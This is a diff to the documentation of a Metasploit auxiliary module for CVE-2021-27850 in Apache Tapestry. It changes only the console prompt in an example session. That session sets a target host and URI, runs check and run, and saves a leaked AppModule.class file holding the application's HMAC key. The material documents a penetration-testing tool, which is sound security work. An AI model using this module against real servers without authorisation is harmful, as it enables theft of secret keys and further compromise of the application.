@@ -34,15 +34,15 @@ This is not a required option and by default the value is `AppModule.class` whic
 ## Scenarios
 
 ```
-msf6 > use auxiliary/gather/cve_2021_27850_apache_tapestry_hmac_key
-msf6 auxiliary(gather/cve_2021_27850_apache_tapestry_hmac_key) > set rhost 172.16.215.155rhost => 172.16.215.155
-msf6 auxiliary(gather/cve_2021_27850_apache_tapestry_hmac_key) > set targeturi /hotels
+msf > use auxiliary/gather/cve_2021_27850_apache_tapestry_hmac_key
+msf auxiliary(gather/cve_2021_27850_apache_tapestry_hmac_key) > set rhost 172.16.215.155rhost => 172.16.215.155
+msf auxiliary(gather/cve_2021_27850_apache_tapestry_hmac_key) > set targeturi /hotels
 targeturi => /hotels
-msf6 auxiliary(gather/cve_2021_27850_apache_tapestry_hmac_key) > check
+msf auxiliary(gather/cve_2021_27850_apache_tapestry_hmac_key) > check
 
 [+] Java file leak at 172.16.215.155:8080/hotels/assets/app/bf78ed9f/services/AppModule.class/
 [+] 172.16.215.155:8080 - The target is vulnerable.
-msf6 auxiliary(gather/cve_2021_27850_apache_tapestry_hmac_key) > run
+msf auxiliary(gather/cve_2021_27850_apache_tapestry_hmac_key) > run
 [*] Running module against 172.16.215.155
 
 [+] Apache Tapestry class file saved at /user/.msf4/loot/20210721173200_default_172.16.215.155_tapestry.AppModu_493080.bin.
